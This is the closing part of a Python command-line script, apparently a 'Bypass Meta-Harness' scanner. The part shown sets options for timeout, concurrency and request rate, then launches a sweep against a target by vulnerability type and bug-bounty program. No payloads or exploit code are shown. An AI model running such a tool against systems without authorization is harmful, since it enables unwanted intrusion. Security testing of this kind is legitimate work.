    p.add_argument("--timeout",     type=int, default=10,  help="Request timeout seconds (default: 10)")
    p.add_argument("--concurrency", "-c", type=int, default=10, help="Max parallel requests (default: 10)")
    p.add_argument("--rps",         type=float, default=5.0,   help="Requests per second (default: 5.0)")
    p.add_argument("--verbose",     "-v", action="store_true", help="Verbose debug output")
    p.add_argument("--quiet",       "-q", action="store_true", help="Only show hits")
    return p


def main() -> None:
    parser = _build_parser()
    args = parser.parse_args()

    mode = "FULL SWEEP" if args.type == "sweep" else args.type.upper()
    print(f"[*] Bypass Meta-Harness", flush=True)
    print(f"[*] Target:  {args.target}", flush=True)
    print(f"[*] Mode:    {mode}", flush=True)
    if args.param:
        print(f"[*] Param:   {args.param}", flush=True)
    if args.program:
        print(f"[*] Program: {args.program}", flush=True)
    print(flush=True)

    asyncio.run(run_and_report(
        target=args.target,
        vuln_type=args.type,
        param=args.param,
        program=args.program,
        output_dir=args.output_dir,
        timeout=args.timeout,
        concurrency=args.concurrency,
        rps=args.rps,
        verbose=args.verbose,
        quiet=args.quiet,
    ))


if __name__ == "__main__":
    main()
